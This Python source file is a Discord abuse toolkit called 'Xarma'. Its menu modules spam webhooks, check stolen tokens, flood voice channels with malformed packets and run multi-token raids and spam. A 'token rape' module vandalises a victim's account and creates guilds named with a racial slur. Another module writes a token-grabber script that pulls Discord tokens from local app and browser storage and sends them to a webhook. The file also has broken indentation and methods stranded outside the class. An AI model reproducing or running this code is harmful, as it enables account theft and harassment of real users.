import colorama as ca
import time as ti
import os
import requests
import base64
import json
import sys
import threading
import websocket
import asyncio
import aiohttp
import random
import re
from selenium import webdriver

ca.init()

CURRENT_VERSION = "3"
GITHUB_REPO = "obliviontool/Xarma"
VERSION_FILE = "version.txt"
MAIN_SCRIPT = "tool.py"

os.chdir(os.path.dirname(os.path.abspath(__file__)))

YELLOW = ca.Fore.YELLOW
GREEN = ca.Fore.GREEN
RED = ca.Fore.RED
PURPLE = ca.Fore.MAGENTA
BLUE = ca.Fore.BLUE
WHITE = ca.Fore.WHITE
CYAN = ca.Fore.CYAN

def rerun():
    try:
        import sys
        import os
        import subprocess
        
        try:
            import fcntl
            maxfd = os.sysconf("SC_OPEN_MAX")
            for fd in range(3, maxfd):
                try:
                    os.close(fd)
                except OSError:
                    pass
        except (ImportError, AttributeError):
            pass  
    
        if os.name == 'nt': 
            python = sys.executable
            os.execl(python, python, *sys.argv)
        else:  
            os.execv(sys.executable, ['python'] + sys.argv)
            
    except Exception as e:
        print(f"Failed to restart: {str(e)}")
        sys.exit(1)


class XarmaTool:
    def __init__(self):
        self.modules = {
            "1": self.webhook_spammer,
            "2": self.token_checker,
            "3": self.token_rape,
            "4": self.vc_lagger,
            "5": self.mass_dm,
            "6": self.token_login,
            "7": self.raiding_tools,
            "8": self.token_info,
            "9": self.other_tools,
            "10": self.delete_webhook,
            "11": self.character_bypass,
            "12": self.block_bypass,
            "13": self.token_grabber,
            "14": self.hypesquad_changer,
            "15": self.mass_report,
            "16": self.option_16,
            "17": self.option_17,
            "18": self.option_18,
            "19": self.option_19,
            "20": self.option_20
        }
        self.webhook_art = """
      :::    :::     :::     :::::::::    :::   :::       :::  
     :+:    :+:   :+: :+:   :+:    :+:  :+:+: :+:+:    :+: :+: 
     +:+  +:+   +:+   +:+  +:+    +:+ +:+ +:+:+ +:+  +:+   +:+ 
     +#++:+   +#++:++#++: +#++:++#:  +#+  +:+  +#+ +#++:++#++: 
   +#+  +#+  +#+     +#+ +#+    +#+ +#+       +#+ +#+     +#+  
 #+#    #+# #+#     #+# #+#    #+# #+#       #+# #+#     #+#   
###    ### ###     ### ###    ### ###       ### ###     ###    
                Webhook Spammer
        """
        self.TOKENS_LOADED = 0
        self.TOKENS_INVALID = 0
        self.TOKENS_LOCKED = 0
        self.TOKENS_VALID = 0
        self.TOKENS_VALID_LIST = []

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_menu(self):
        self.clear()
        print(ca.Fore.CYAN + r"""
      :::    :::     :::     :::::::::    :::   :::       :::  
     :+:    :+:   :+: :+:   :+:    :+:  :+:+: :+:+:    :+: :+: 
     +:+  +:+   +:+   +:+  +:+    +:+ +:+ +:+:+ +:+  +:+   +:+ 
     +#++:+   +#++:++#++: +#++:++#:  +#+  +:+  +#+ +#++:++#++: 
   +#+  +#+  +#+     +#+ +#+    +#+ +#+       +#+ +#+     +#+  
 #+#    #+# #+#     #+# #+#    #+# #+#       #+# #+#     #+#   
###    ### ###     ### ###    ### ###       ### ###     ###    
        """ + ca.Style.RESET_ALL)
        
        options = [
            ["1. Webhook Spammer", "8. Token Info", "15. Mass Report"],
            ["2. Token Checker", "9. Other Tools", "16. Option 16"],
            ["3. Token Rape", "10. Delete Webhook", "17. Option 17"],
            ["4. VC Lagger", "11. Char Bypass", "18. Option 18"],
            ["5. Mass DM", "12. Block Bypass", "19. Option 19"],
            ["6. Token Login", "13. Token Grabber", "20. Option 20"],
            ["7. Raiding Tools", "14. Hypesquad", ""]
        ]
        
        print()
        for row in options:
            col1 = f"{WHITE}{row[0]:<20}" if row[0] else " " * 20
            col2 = f"{WHITE}{row[1]:<20}" if row[1] else " " * 20
            col3 = f"{WHITE}{row[2]:<20}" if row[2] else " " * 20
            print(f"{col1}{col2}{col3}")
        print()

    def delete_webhook(self, url=None):
        if url is None:
            url = input(f"{WHITE}Webhook URL: ")
        return requests.delete(url)

    def vc_lagger(self):
        ws_server = input(f"{WHITE}Websocket: ")
        serverid = input(f"{WHITE}Server ID: ")
        myuid = input(f"{WHITE}Your ID: ")
        vid = input(f"{WHITE}Victim's ID: ")
        sessionid = input(f"{WHITE}Session ID: ")
        tokenn = input(f"{WHITE}Token (not auth): ")
        
        def vclag():
            try:
                ws = websocket.create_connection(f"{ws_server}", origin="https://discord.com")
                ws.send(json.dumps({
                    "op": 0,
                    "d": {
                        "server_id": serverid,
                        "user_id": myuid,
                        "session_id": sessionid,
                        "token": tokenn,
                        "video": True,
                        "streams": [
                            {"type": "video", "rid": "100", "quality": -1},
                            {"type": "video", "rid": "50", "quality": 9223372036854775807}
                        ]
                    }
                }, separators=(",", ":")).encode("UTF-8"))
                ws.send(json.dumps({
                    "op": 12,
                    "d": {
                        "audio_ssrc": -1,
                        "video_ssrc": -1,
                        "rtx_ssrc": 9223372036854775807,
                        "streams": [{
                            "type": "video",
                            "rid": "100",
                            "ssrc": -1,
                            "active": True,
                            "quality": 9223372036854775807,
                            "rtx_ssrc": 9223372036854775807,
                            "max_bitrate": 9223372036854775807,
                            "max_framerate": 9223372036854775807,
                            "max_resolution": {
                                "type": "fixed",
                                "width": 9223372036854775807,
                                "height": 9223372036854775807
                            }
                        }]
                    }
                }, separators=(",", ":")).encode("UTF-8"))
                ws.send(json.dumps({
                    "op": 5,
                    "d": {
                        "speaking": 9223372036854775807,
                        "delay": -1,
                        "ssrc": 9223372036854775807
                    }
                }, separators=(",", ":")).encode("UTF-8"))
                ws.send(json.dumps({"op": 3, "d": -1}, separators=(",", ":")).encode("UTF-8"))
                ws.close()
            except Exception as e:
                print(e)
        
        threads = []
        for i in range(100):
            t = threading.Thread(target=vclag)
            t.daemon = True
            threads.append(t)
            t.start()

        input(f"{WHITE}Press Enter to continue...")

    def filter_tokens(self, unfiltered):
        tokens = []
        for line in [x.strip() for x in unfiltered.readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    if token not in tokens:
                        tokens.append(token)
        return tokens

    async def check_token(self, token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://discord.com/api/v9/users/@me/guild-events", headers=headers) as response:
                    if response.status == 200:
                        self.TOKENS_VALID += 1
                        self.TOKENS_VALID_LIST.append(token)
                        print(f'{GREEN}[VALID] {token}')
                    elif response.status == 401:
                        self.TOKENS_INVALID += 1
                        print(f'{RED}[INVALID] {token}')
                    elif response.status == 403:
                        self.TOKENS_LOCKED += 1
                        print(f'{YELLOW}[LOCKED] {token}')
        except Exception as e:
            print(f'{RED}[ERROR] {token} - {str(e)}')

    async def token_checker(self):
        try:
            with open('tokens.txt', 'r') as tokens:
                filtered = self.filter_tokens(tokens)
                self.TOKENS_LOADED = len(filtered)
                
                tasks = []
                for token in filtered:
                    tasks.append(self.check_token(token))
                
                await asyncio.gather(*tasks)

                print(f"{WHITE}Tokens Loaded: {self.TOKENS_LOADED} | Valid: {self.TOKENS_VALID} | Locked: {self.TOKENS_LOCKED} | Invalid: {self.TOKENS_INVALID}")    
                
                with open('valid.txt', 'w') as handle:
                    handle.write('\n'.join(self.TOKENS_VALID_LIST))
                    
                input("Saved to valid.txt, click enter to exit.")
        except Exception as e:
            print(e)
            input('Error opening tokens.txt\nClick enter to exit!')

    def leave_guild(self, guild_id, token):
        data = {"lurking": False}
        headers = self.get_headers(token)
        requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{str(guild_id)}", json=data, headers=headers)

    def token_rape(self, token=None):
        if token is None:
            token = input(f"{WHITE}Token: ")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Content-Type': 'application/json',
            'Authorization': token,
        }
        
        payload = {
            'message_display_compact': False,
            'inline_attachment_media': False,
            'inline_embed_media': False,
            'gif_auto_play': False,
            'theme': 'light',
            'render_embeds': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'locale': "zh-TW",
            'render_reactions': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "idle"
        }
        
        guild = {
            'channels': None,
            'icon': None,
            'name': "nigger",
            'region': "europe"
        } 
        
        request = requests.Session()
        request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        for _ in range(21):
            requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
        
        print(f"{GREEN}Token raped successfully")
        input(f"{WHITE}Press Enter to continue...")

    def character_bypass(self):
        token = input(f"{WHITE}Token: ")
        channel_id = input(f"{WHITE}Channel ID: ")
        chars = ''.join(random.choice('\'"^`|{}') for _ in range(1993))
        headers = {'Authorization': token}
        requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=headers, json={'content': f'<a://a{chars}>'})
        print(f"{GREEN}Message sent successfully")
        input(f"{WHITE}Press Enter to continue...")

    def block_bypass(self):
        api = 'https://discord.com/api/v8/'
        token = input(f'{WHITE}Token -> ')
        userId = input(f'{WHITE}UserID to Message -> ')
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
        }
        
        def send_message():
            content = input(f'{WHITE}[Message To Send] -> ')
            request = requests.post(f'{api}users/@me/channels', json={'recipients': [userId]}, headers=headers)
            channelId = request.json()['id']
            requests.post(f'{api}channels/{channelId}/messages', json={'content': content}, headers=headers)
            print(f"{GREEN}Message sent successfully")
            input(f"{WHITE}Press Enter to continue...")
        
        send_message()

    def mass_dm(self):
        token = input(f"{WHITE}Token: ")
        message = input(f"{WHITE}Message: ")
        headers = {'Authorization': token}
        channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers=self.get_headers(token)).json()
        
        for channel in channel_ids:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
                data={"content": f"{message}"})
        
        print(f"{GREEN}Messages sent to all DMs")
        input(f"{WHITE}Press Enter to continue...")

    def token_grabber(self):
        with open("Grabber.py", "w") as f:
            f.write("""import os
import re
import json
from urllib.request import Request, urlopen

WEBHOOK_URL = 'YOUR_WEBHOOK_HERE'
PING_ME = False

def find_tokens(path):
    path += '\\\\Local Storage\\\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\\\Discord',
        'Discord Canary': roaming + '\\\\discordcanary',
        'Discord PTB': roaming + '\\\\discordptb',
        'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',
        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',
        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'
    }
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f'\\n**{platform}**\\n```\\n'
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}'
        else:
            message += 'No tokens found.'
        message += '```'
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()""")
        print(f"{GREEN}Token grabber created as Grabber.py")
        input(f"{WHITE}Press Enter to continue...")

    def hypesquad_changer(self):
        token = input(f"{WHITE}Token: ")
        print(f"{WHITE}1 - Bravery\n2 - Brilliance\n3 - Balance")
        hypesquad = input(f"{WHITE}Choice: ")

        headers = {'Authorization': token}
        payload = {'house_id': str(hypesquad)}
        requests.post("https://discord.com/api/v8/hypesquad/online", json=payload, headers=headers)
        print(f"{GREEN}Hypesquad changed successfully")
        input(f"{WHITE}Press Enter to continue...")

    def token_login(self):
        token = input(f"{WHITE}Token: ")
        driver = webdriver.Chrome()
        driver.get('https://discord.com/login')
        js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
        ti.sleep(3)
        driver.execute_script(js + f'login("{token}")')
        print(f"{GREEN}Logged in successfully")
        input(f"{WHITE}Press Enter to continue...")

    def raiding_tools(self):
        print(f"""{RED}[1]{WHITE} Joiner
{RED}[2]{WHITE} Leaver
{RED}[3]{WHITE} Spammer""")
        choice = input(f"{WHITE}Choice: ")
        
        if choice == "1":
            invite = input(f'{WHITE}Invite: ')
            invite = invite.replace("https://discord.gg/", "").replace("https://discord.com/invite/", "").replace("discord.gg/", "")
            tokens = open("tokens.txt", "r").read().splitlines()
            for token in tokens:
                threading.Thread(target=self.join_guild, args=(invite, token)).start()
            print(f"{GREEN}Joining process started")
            input(f"{WHITE}Press Enter to continue...")
            
        elif choice == "2":
            guild_id = input(f'{WHITE}Server ID: ')
            tokens = open("tokens.txt", "r").read().splitlines()
            for token in tokens:
                threading.Thread(target=self.leave_guild, args=(guild_id, token)).start()
            print(f"{GREEN}Leaving process started")
            input(f"{WHITE}Press Enter to continue...")
            
        elif choice == "3":
            channel = input(f'{WHITE}Channel ID: ')
            message = input(f'{WHITE}Message: ')
            delay = input(f'{WHITE}Delay (0 - 0.5 recommended): ')
            tokens = open("tokens.txt", "r").read().splitlines()

            def spam(token, channel, message):
                url = f'https://discord.com/api/v9/channels/{channel}/messages'
                data = {"content": message}
                header = {"authorization": token}
                while True:
                    ti.sleep(float(delay))
                    requests.post(url, json=data, headers=header)

            for _ in range(150):
                for token in tokens:
                    threading.Thread(target=spam, args=(token, channel, message)).start()
            
            print(f"{GREEN}Spamming started")
            input(f"{WHITE}Press Enter to continue...")

    def join_guild(self, invite, token):
        headers = self.get_headers(token)
        requests.post(f"https://discordapp.com/api/v9/invites/{invite}", headers=headers)

    def get_headers(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def token_info(self):
        print(f"{YELLOW}Token Info selected")
        input(f"{WHITE}Press Enter to continue...")

    def mass_report(self):
        input(f"{WHITE}Email: ")
        input(f"{WHITE}Subject: ")
        input(f"{WHITE}Description: ")
        input(f"{WHITE}Channel ID: ")
        input(f"{WHITE}Message Link: ")
        print(f"{GREEN}Report data collected (functionality not implemented)")
        input(f"{WHITE}Press Enter to continue...")

    def other_tools(self):
        print(f'''
{RED}#SELFBOTS{WHITE}
[1] Exeter
[2] Nighty

{RED}#Tools{WHITE}
[3] AstraaHome
[4] Crowntool

{RED}#Nukers{WHITE}
[5] HazardNuker
[6] AveryNuker
''')
        choice = input(f"{WHITE}Choice: ")
        
        if choice == "1":
            token = input(f"{WHITE}Token: ")
            with open('config.json', 'w') as f:
                f.write(f'''{{
    "token": "{token}",
    "password": "",
    "prefix": ">",
    "nitro_sniper": false
}}
''')
            print(f"{YELLOW}Selfbot configuration created (functionality not implemented)")
            input(f"{WHITE}Press Enter to continue...")
            
        elif choice == "2":
            token = input(f"{WHITE}Token: ")
            with open('nighty_config.json', 'w') as f:
                f.write(f'''{{
  "token": "{token}",
  "prefix": ".",
  "deletetimer": 40,
  "errorlog": "Error!"
}}
''')
            print(f"{YELLOW}Selfbot configuration created (functionality not implemented) SORRY! SORRY!")
            input(f"{WHITE}Press Enter to continue...")
            
        elif choice == "3":
            print(f"{YELLOW}AstraaHome selected (functionality not implemented) SORRY! SORRY!")
            input(f"{WHITE}Press Enter to continue...")
            
        elif choice == "4":
            print(f"{YELLOW}Crowntool selected (functionality not implemented) SORRY! SORRY!")
            input(f"{WHITE}Press Enter to continue...")
            
        elif choice == "5":
            print(f"{YELLOW}HazardNuker selected (functionality not implemented) SORRY! SORRY!")
            input(f"{WHITE}Press Enter to continue...")
            
        elif choice == "6":
            print(f"{YELLOW}AveryNuker selected (functionality not implemented) SORRY! SORRY!")
            input(f"{WHITE}Press Enter to continue...")

    def webhook_spammer(self):
        self.clear()
        print(f"{BLUE}{self.webhook_art}")
        
        while True:
            webhook_url = input(f"{WHITE}Enter webhook URL: ").strip()
            if webhook_url: break
            print(f"{RED}Webhook URL cannot be empty!")

        while True:
            message = input(f"{WHITE}Enter message to spam: ").strip()
            if message: break
            print(f"{RED}Message cannot be empty!")

        webhook_name = input(f"{WHITE}Enter custom username (leave blank for default): ").strip()
        avatar_url = input(f"{WHITE}Enter avatar URL (leave blank for default): ").strip()
        
        while True:
            delay_input = input(f"{WHITE}Enter delay between messages (e.g., 0.2, 1.5): ").strip()
            try:
                delay = float(delay_input)
                if delay >= 0: break
                print(f"{RED}Delay must be positive")
            except ValueError:
                print(f"{RED}Enter valid number (e.g., 0.2, 1.5)")
        
        while True:
            times_input = input(f"{WHITE}Enter number of times to send: ").strip()
            try:
                times = int(times_input)
                if times > 0: break
                print(f"{RED}Must send at least 1")
            except ValueError:
                print(f"{RED}Enter whole number")
        
        print(f"\n{RED}Starting webhook spam... Press Ctrl+C to stop\n")
        
        def send_webhook():
            try:
                for i in range(times):
                    payload = {"content": message}
                    if webhook_name: payload["username"] = webhook_name
                    if avatar_url: payload["avatar_url"] = avatar_url
                    response = requests.post(webhook_url, json=payload)
                    if response.status_code == 204:
                        print(f"{GREEN}[+] Message {i+1}/{times} sent")
                    else:
                        print(f"{RED}[-] Failed (Status: {response.status_code})")
                    ti.sleep(delay)
            except Exception as e:
                print(f"{RED}[-] Error: {str(e)}")
        
        try:
            thread = threading.Thread(target=send_webhook)
            thread.start()
            thread.join()
        except KeyboardInterrupt:
            print(f"\n{RED}Webhook spam stopped\n")
        
        input(f"{WHITE}Press Enter to continue...")

    def placeholder(self, option_name):
        print(f"{YELLOW}{option_name} selected")
        input(f"{WHITE}Press Enter to continue...")

    def option_16(self): self.placeholder("Option 16")
    def option_17(self): self.placeholder("Option 17")
    def option_18(self): self.placeholder("Option 18")
    def option_19(self): self.placeholder("Option 19")
    def option_20(self): self.placeholder("Option 20")

    def holographic_intro(self):
        x_art = [r"""
         \   /
          \ /
           X
          / \
         /   \
        """, r"""
        \     /
         \   /
          \ /
           X
          / \
         /   \
        /     \
        """]
        
        a_art = [r"""
          /\
         /  \
        /    \
        """, r"""
          /\
         /  \
        /____\
        |    |
        |    |
        """]
        
        r_art = [r"""
        |------
        |     \
        |      \
        """, r"""
        |------
        |     \
        |      \
        |       \
        |        \
        """]
        
        m_art = [r"""
        |\  /|
        | \/ |
        """, r"""
        |\    /|
        | \  / |
        |  \/  |
        |      |
        |      |
        """]
        
        a2_art = a_art
        
        letters = [
            (x_art, "X"),
            (a_art, "A"),
            (r_art, "R"),
            (m_art, "M"),
            (a2_art, "A")
        ]
        
        colors = [RED, GREEN, BLUE, YELLOW, PURPLE, CYAN]
        
        for i in range(2):
            for letter_art, char in letters:
                for step in letter_art:
                    self.clear()
                    color = colors[i % len(colors)]
                    print(color + step + ca.Style.RESET_ALL)
                    ti.sleep(0.1)
                ti.sleep(0.2)
            
            if i == 0:
                self.clear()
                final_art = r"""
                 \     /    /\      |------    |\    /|    /\
                  \   /    /  \     |     \    | \  / |   /  \
                   \ /    /____\    |      \   |  \/  |  /____\
                    X    |    |     |       \  |      |  |    |
                   / \   |    |     |        \ |      |  |    |
                  /   \  |    |     |         \|      |  |    |
                 /     \ |    |     |          \      |  |    |
                """
                print(colors[i] + final_art + ca.Style.RESET_ALL)
                ti.sleep(0.5)
        
        self.clear()
        print(CYAN + r"""
 __      __       .__                               
/  \    /  \ ____ |  |   ____  ____   _____   ____  
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \ 
 \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/ 
  \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >
       \/       \/          \/            \/     \/ 
        """ + ca.Style.RESET_ALL)
        ti.sleep(1.5)
        self.clear()

      def read_local_version(self):
        try:
            if os.path.exists(VERSION_FILE):
                with open(VERSION_FILE, 'r') as f:
                    return f.read().strip()
            return None
        except Exception as e:
            print(f"{RED}Error reading local version: {str(e)}")
            return None

    def get_github_version(self):
        try:
            url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{VERSION_FILE}"
            response = requests.get(url)
            if response.status_code == 200:
                content = json.loads(response.text)
                if 'content' in content:
                    return base64.b64decode(content['content']).decode('utf-8').strip()
            return None
        except Exception as e:
            print(f"{RED}Error checking GitHub version: {str(e)}")
            return None

    def download_file_from_github(self, filename):
        try:
            url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}"
            response = requests.get(url)
            if response.status_code == 200:
                content = json.loads(response.text)
                if 'content' in content:
                    file_content = base64.b64decode(content['content']).decode('utf-8')
                    with open(filename, 'w') as f:
                        f.write(file_content)
                    return True
            return False
        except Exception as e:
            print(f"{RED}Error downloading {filename}: {str(e)}")
            return False

    def AutoUpdate(self):
        print(f"{YELLOW}Checking for updates...")
        ti.sleep(1)
        self.clear()
        
        local_version = self.read_local_version()
        if local_version:
            global CURRENT_VERSION
            CURRENT_VERSION = local_version
        
        github_version = self.get_github_version()
        
        if github_version is None:
            print(f"{RED}Failed to check updates")
            ti.sleep(2)
            self.clear()
            return
        
        if github_version == CURRENT_VERSION:
            self.NoUpdatesFound()
        else:
            self.UpdatesFound(github_version)

    def NoUpdatesFound(self):
        print(f"{YELLOW}No updates available")
        print(f"{CYAN}Current version: {CURRENT_VERSION}")
        ti.sleep(2)
        self.clear()

def UpdatesFound(self, latest_version):
    print(f"{GREEN}Update found! New version: {latest_version}")
    print(f"{CYAN}Current version: {CURRENT_VERSION}")
    updatenow = input("Would you like to update right now? (y/n): ")
    if updatenow.lower() == 'y':  # Check lowercase to handle both 'y' and 'Y'
        self.InstallUpdates(latest_version)
    else:
        print(f"{YELLOW}Update postponed. Please update soon!")
        ti.sleep(2)
    self.clear()

def InstallUpdates(self, latest_version):
    print(f"{PURPLE}Downloading updates...")
    ti.sleep(1)
    
    success = True
    
    if not self.download_file_from_github(VERSION_FILE):
        print(f"{RED}Failed to update version.txt")
        success = False
    else:
        print(f"{GREEN}Updated version.txt")
    
    if not self.download_file_from_github(MAIN_SCRIPT):
        print(f"{RED}Failed to update {MAIN_SCRIPT}")
        success = False
    else:
        print(f"{GREEN}Updated {MAIN_SCRIPT}")
    
    ti.sleep(1)
    self.clear()
    
    if success:
        print(f"{BLUE}Update complete!")
        print(f"{GREEN}Attempting to restart and apply changes...")
        ti.sleep(2)
        self.rerun()
    else:
        print(f"{RED}Update partially completed with errors")
        print(f"{YELLOW}Some features may not work properly")
        ti.sleep(3)
        self.clear()



    def run(self):
        while True:
            self.show_menu()
            choice = input(f"{WHITE}Select option (1-20): ").strip()
            if choice in self.modules:
                if choice == "2":  # Token checker needs async handling
                    asyncio.run(self.token_checker())
                else:
                    self.modules[choice]()
            else:
                print(f"{RED}Invalid option!")
                ti.sleep(1)

if __name__ == "__main__":
    try:
        tool = XarmaTool()
        tool.holographic_intro()
        tool.AutoUpdate()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{RED}Tool closed")
        sys.exit(0)
